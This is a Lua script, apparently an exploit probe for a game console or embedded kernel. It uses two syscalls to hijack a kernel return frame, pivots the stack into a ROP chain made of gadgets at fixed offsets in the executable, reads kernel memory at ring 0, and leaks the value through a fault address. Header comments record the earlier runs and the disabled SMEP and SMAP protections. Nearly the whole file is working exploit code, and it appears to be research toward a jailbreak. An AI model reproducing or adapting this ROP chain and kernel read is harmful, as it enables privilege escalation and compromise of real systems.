-- CRASH_CLASS: RISKY -- ring-0 chain; the process dies by design, console survives
-- PROBE 1367a: ring-0 kernel read, exfiltrated through si_addr
--
-- 1366a proved the ring-0 chain executes on 14.10: 417 installed the frame, the
-- kernel's own return iret went to CS=0x08, `pop rsp; ret` pivoted to our chain,
-- the chain read a supervisor page at the kernel base and wrote it into our own
-- heap, and the final iretq returned to CPL3 at the RIP we had put in the chain's
-- return frame (evidenced by the dump: RIP = that value, signo 10, si_addr 0x16).
-- SMEP and SMAP are both off, so a user page can hold the ROP stack and user
-- memory can be read/written at CPL0.
--
-- What broke was only the return: resuming inside libkernel's post-`syscall`
-- stub faults (SIGBUS, si_addr 0x16 = a TLS pointer that the kernel's epilogue
-- would have restored), so userland cannot continue after the chain -- the loader
-- dumps and exits. That limits each run to one observable value, and si_addr is
-- the observer: the chain stores the kernel qword into the return frame's RIP
-- slot, and the resulting user-mode #PF reports that value as the fault address.
--
-- This run reads kbase+0, which should be the ELF header. If the value is
-- 0x00010102464C457F the fault address prints as 0x10102464C457F and the read is
-- proven byte for byte. If the console panics instead, kbase+0 is not mapped
-- (the fault oracle said it was) -- that is also an answer, but it costs a reboot.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1366a_ring0_kernel_read_20261109_115002.txt
--   results/phase35_dead_end_reruns/1365a_chain_gadget_validate_20261109_114725.txt
--   results/phase35_dead_end_reruns/1364a_eboot_gadgets_range_20261109_114214.txt
--   results/phase35_dead_end_reruns/1359a_sys417_frame_ride_20261109_113019.txt

if _G.__p1367_ran then
    print("[!] RE-ENTRY")
    print("=== PROBE 1367a RE-ENTRY ===")
    return
end
_G.__p1367_ran = true

print("=== PROBE 1367a: RING-0 KERNEL READ VIA si_addr ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function u64v(v) return uint64(string.format("0x%X", v)) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local KBASE_HI = 0xFFFFFFFF
local KBASE_LO = 0xC1000000

local sc593 = make_syscall(593)
local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc20 = make_syscall(20)

print(string.format("[0] pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local EBN = to_num(eb_lo) + to_num(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X  read target=0x%X%08X", EBN, KBASE_HI, KBASE_LO))

local S = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(S + off, 0) end
local SA = to_num(S)
local FP = SA + 0x100

local G_POPSI  = EBN + 0xD77D
local G_MOVRD  = EBN + 0x1A5CC4
local G_POPRDI = EBN + 0xC9DFE
local G_MOVWR  = EBN + 0x92C67
local G_POPRSP = EBN + 0x9A2
local G_IRET   = EBN + 0x11F41

-- chain: rax = [kbase] ; [FP+8] = rax ; iretq with RIP = rax
wrq(S + 0x00, u64v(G_POPSI))
wrq(S + 0x08, U(KBASE_HI, KBASE_LO))
wrq(S + 0x10, u64v(G_MOVRD))
wrq(S + 0x18, u64v(G_POPRDI))
wrq(S + 0x20, u64v(FP + 0x08))
wrq(S + 0x28, u64v(G_MOVWR))
wrq(S + 0x30, u64v(G_POPRSP))
wrq(S + 0x38, u64v(FP))

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
local ok421, rv421 = pcall(function() return sc421(uint64(F)) end)
if not ok421 then print("=== PROBE 1367a ABORT (421) ===") return end
local orig_rip    = rdq(F + 0xE0)
local orig_cs     = rdq(F + 0xE8)
local orig_rflags = rdq(F + 0xF0)
local orig_rsp    = rdq(F + 0xF8)
local orig_ss     = rdq(F + 0x100)
print(string.format("[1] frame=0x%X chain=0x%X live RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X SS=0x%X",
    to_num(F), SA, orig_rip or 0, orig_cs or 0, orig_rflags or 0, orig_rsp or 0, orig_ss or 0))
if (orig_cs or 0) ~= 0x43 then print("=== PROBE 1367a: unexpected CS, ABORT ===") return end

-- return frame: RIP is filled by the chain, everything else is a plain CPL3 return
wrq(FP + 0x00, u64v(G_IRET))
wrq(FP + 0x08, u64v(0x10000))          -- overwritten by the chain
wrq(FP + 0x10, u64v(0x43))
wrq(FP + 0x18, u64v(orig_rflags))
wrq(FP + 0x20, u64v(orig_rsp))
wrq(FP + 0x28, u64v(0x3B))

wrq(F + 0xE0, u64v(G_POPRSP))
wrq(F + 0xE8, u64v(0x08))
wrq(F + 0xF8, u64v(SA))

print("[2] chain = mov rax,[kbase] ; [FP+8]=rax ; iretq -> CPL3 with RIP=[kbase]")
print("    expected SIGSEGV si_addr = the 8 bytes at kbase (ELF magic 7F 45 4C 46)")
print("[2] installing frame ...")
local ok417, rv417 = pcall(function() return sc417(u64v(to_num(F))) end)
if ok417 then
    print(string.format("[2] 417 returned %s (no ring-0 entry)", tostring(to_num(rv417))))
else
    print("[2] 417 EXC")
end
print(string.format("[3] FP+8 now = 0x%X", rdq(S + 0x108) or 0))
print("=== PROBE 1367a COMPLETE ===")
